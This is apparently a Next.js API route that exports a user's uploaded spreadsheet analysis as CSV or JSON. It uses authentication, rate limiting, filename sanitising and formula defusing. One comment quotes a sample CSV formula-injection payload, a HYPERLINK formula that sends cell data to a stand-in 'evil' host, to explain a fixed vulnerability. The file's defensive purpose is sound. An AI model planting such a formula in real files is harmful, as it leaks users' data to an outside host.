import { NextResponse } from "next/server";
import { createClient } from "@/lib/supabase/server";
import { logApiError } from "@/lib/log-error";
import { allowExport } from "@/lib/export-guard";
import { toCSV } from "@/lib/download/table-csv";

export const dynamic = "force-dynamic";

/**
 * EXPORT — the parsed table back out, or the findings as JSON.
 *
 * The CSV is written by lib/download/table-csv.ts, which quotes AND
 * defuses: a value containing a comma, a quote or a newline round-trips
 * back through our own parser unchanged, and a value that would be a
 * formula in Excel does not execute there. Both halves matter — a file
 * the user can put somewhere else and still have their data, and open
 * without being attacked by it.
 *
 * The filename is sanitised rather than trusted. A stored title
 * containing a quote or a newline would otherwise break out of the
 * Content-Disposition header — a header-injection whose payload is a
 * field the user typed themselves.
 */
export async function GET(request: Request, props: { params: Promise<{ id: string }> }) {
  const params = await props.params;
  const supabase = await createClient();
  const {
    data: { user },
  } = await supabase.auth.getUser();
  if (!user) return NextResponse.json({ error: "not_signed_in" }, { status: 401 });

  // Free on purpose — the analysis was paid for when it ran — but not
  // unbounded, for the reason in lib/export-guard.ts. This one serialises
  // EVERY ROW of the uploaded spreadsheet on each request; it was missed
  // when the four PDF routes were bounded because it renders nothing, and
  // "hands the caller a file" turned out to be the population that
  // matters rather than "renders a document".
  if (!(await allowExport(user.id))) {
    return NextResponse.json({ error: "too_many_exports" }, { status: 429 });
  }

  try {
    const format = new URL(request.url).searchParams.get("format") === "json" ? "json" : "csv";

    const { data: analysis, error } = await supabase
      .from("data_analyses")
      .select("title, headers, rows, profile, findings")
      .eq("id", params.id)
      .maybeSingle();
    if (error) throw error;
    if (!analysis) return NextResponse.json({ error: "not_found" }, { status: 404 });

    const safeName =
      String(analysis.title ?? "dataset")
        .replace(/[^A-Za-z0-9._-]+/g, "-")
        .replace(/^-+|-+$/g, "")
        .slice(0, 60) || "dataset";

    if (format === "json") {
      const body = JSON.stringify(
        {
          title: analysis.title,
          headers: analysis.headers,
          profile: analysis.profile,
          findings: analysis.findings,
          rows: analysis.rows,
        },
        null,
        2
      );
      return new NextResponse(body, {
        headers: {
          "Content-Type": "application/json; charset=utf-8",
          "Content-Disposition": `attachment; filename="${safeName}.json"`,
        },
      });
    }

    // lib/download/table-csv.ts, NOT a second writer of our own. This
    // route used store.ts's toCsv, which quoted and shipped the payload
    // intact: a cell beginning `=`, `@` or `+`/`-` reached the user's
    // Excel and was executed there, and the data-analysis upload stores
    // rows verbatim, so a supplier's price list carrying
    // `=HYPERLINK("http://evil/?"&A1,"Click")` survived upload, storage
    // and download. Quoting is not a defence — Excel strips CSV quotes
    // before it evaluates the cell. escapeCSVValue defuses first.
    const csv = toCSV((analysis.headers ?? []) as string[], (analysis.rows ?? []) as string[][]);
    return new NextResponse(csv, {
      headers: {
        "Content-Type": "text/csv; charset=utf-8",
        "Content-Disposition": `attachment; filename="${safeName}.csv"`,
      },
    });
  } catch (err) {
    logApiError("/api/data-analysis/export", err);
    return NextResponse.json({ error: "export_failed" }, { status: 500 });
  }
}
